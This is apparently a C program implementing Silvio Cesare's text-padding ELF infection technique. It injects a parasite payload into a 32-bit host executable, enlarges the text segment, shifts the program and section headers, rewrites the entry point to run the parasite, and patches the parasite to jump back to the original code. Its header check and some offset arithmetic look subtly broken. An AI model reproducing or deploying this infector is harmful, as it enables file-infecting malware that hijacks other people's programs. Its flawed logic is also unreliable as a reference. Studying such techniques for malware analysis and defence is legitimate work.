/* Inject an ELF by using Silvio's Cesare text appending
 * and padding method */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>

#define MAX_PARASITE 4096
#define PAGE_SIZE 4096
#define TMP "tmp.bin"

#ifndef DEBUG
#define DEBUG 1 
#endif

int hfd, pfd;
int patch_position;
struct stat hst, pst;

void infect_elf();

int main(int argc, char **argv)
{
    if (argc != 4)
    {
        printf("usage: %s <host> <parasite> <patch-position>\n", argv[0]);
        exit(1);
    }

    patch_position = atoi(argv[3]);

    if ((hfd = open(argv[1], O_RDONLY)) == -1) 
    {
        perror("host open");
        exit(-1);
    }

    if ((pfd = open(argv[2], O_RDONLY)) == -1)
    {
        perror("parasite open");
        exit(-1);
    }

    if (fstat(hfd, &hst))
    {
        perror("host stat");
        exit(-1);
    }
     
    if (fstat(pfd, &pst))
    {
        perror("parasite stat");
        exit(-1);
    }

    infect_elf();
}

void infect_elf()
{
    
    unsigned long entry_point, text_offset, text_begin;
    unsigned char *mem;
    unsigned int entry_offset;
    unsigned char buf[MAX_PARASITE];
    unsigned int ehdr_size;
    int ofd;
    int psize;
    int text_found;
    Elf32_Ehdr *e_hdr;
    Elf32_Phdr *p_hdr;
    Elf32_Shdr *s_hdr;
    int i;


    psize = pst.st_size;
    if (DEBUG)
    {
        printf("psize = %d\n", psize);
    }

    mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
    if (mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }

    e_hdr = (Elf32_Ehdr *) mem;
    entry_point = e_hdr->e_entry;
    ehdr_size = sizeof(Elf32_Ehdr);

    if (DEBUG)
    {
        printf("ehdr_size: %d\n", ehdr_size);
    }

    if (!(e_hdr->e_ident[0] == 0x7f && strcmp(&e_hdr->e_ident[1], "ELF")))
    {
        printf("host is not an ELF\n");
        exit(-1);
    }

    text_found = 0;
    p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);

    // iterate over phdrs looking for the text segment
    for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
    {
        if (text_found)
        {
            // while (psize > PAGE_SIZE) {
            p_hdr->p_offset += PAGE_SIZE;
            // p_hdr->p_vaddr += PAGE_SIZE;
            // psize -= PAGE_SIZE
        }

        if (p_hdr->p_type == PT_LOAD)
            if (p_hdr->p_flags == (PF_R | PF_X))
            {
                text_found++;
                text_offset = p_hdr->p_offset; // offset of text segment on file
                text_begin = p_hdr->p_vaddr; 
                entry_offset = p_hdr->p_filesz; // offset to make correct entry point
                p_hdr->p_filesz += psize;
                p_hdr->p_memsz += psize;
                if (DEBUG)
                {
                    printf("Going to place parasite at 0x%x in file\n", 
                        text_offset + entry_offset); 
                    printf("Going to place parasite at 0x%x in image\n",
                        p_hdr->p_vaddr + entry_offset);
                }
            }
    }

    // push section header table
    e_hdr->e_shoff += PAGE_SIZE;

    s_hdr = (Elf32_Shdr *) (mem + e_hdr->e_shoff);
    for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
    {
        if (s_hdr->sh_offset > (entry_offset + psize))
        {
            s_hdr->sh_offset += PAGE_SIZE;
        }
    }


    // modify entry_point to point to parasite at the end of .text
    e_hdr->e_entry = text_begin + entry_offset;
    if (DEBUG)
    {
        printf("set entry point to 0x%x\n", e_hdr->e_entry);
    }
    // read parasite into buffer
    if (read(pfd, buf, MAX_PARASITE) == -1)
    {
        perror("parasite: read");
        exit(-1);
    }

    int preparasite_size = ehdr_size + text_offset + entry_offset;
    if (DEBUG)
    {
        printf("preparasite_size = 0x%x\n", preparasite_size);
    }

    // patch parasite code
    *(unsigned long *)&buf[patch_position] = entry_point;
    printf("Patching parasite to jmp to %x\n", entry_point);

    // begin writing 
    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, hst.st_mode)) == -1)
    {
        perror("tmp binary: open");
        exit(-1);
    }

    unsigned int wrote;

    if ((wrote = write(ofd, mem, preparasite_size)) != preparasite_size)
    {
        perror("tmp binary: write contents up to parasite");
        exit(-1);
    }
    if (DEBUG)
    {
        printf("wrote 0x%x bytes of preparasite information\n", wrote);
    }

    if ((wrote = write(ofd, buf, psize)) < 0) 
    {
        perror("tmp binary: write parasite");
        exit(-1);
    }
    if (DEBUG)
    {
        printf("wrote 0x%x bytes of parasite information\n", wrote);
    }

    if (DEBUG) 
    {
        printf("about to write 0x%x bytes to pad to PAGE_SIZE\n", PAGE_SIZE-(preparasite_size + psize));
    }
    if (lseek(ofd, PAGE_SIZE-(preparasite_size + psize) , SEEK_SET) < 0)
    {
        perror("seek");
        exit(-1);
    }

    mem += ehdr_size + text_offset + entry_offset + psize;
    if (write(ofd, mem, hst.st_size-preparasite_size) != hst.st_size-preparasite_size)
    {
        perror("tmp binary: write post injection");
        exit(-1);
    }

    close(ofd);
    
}

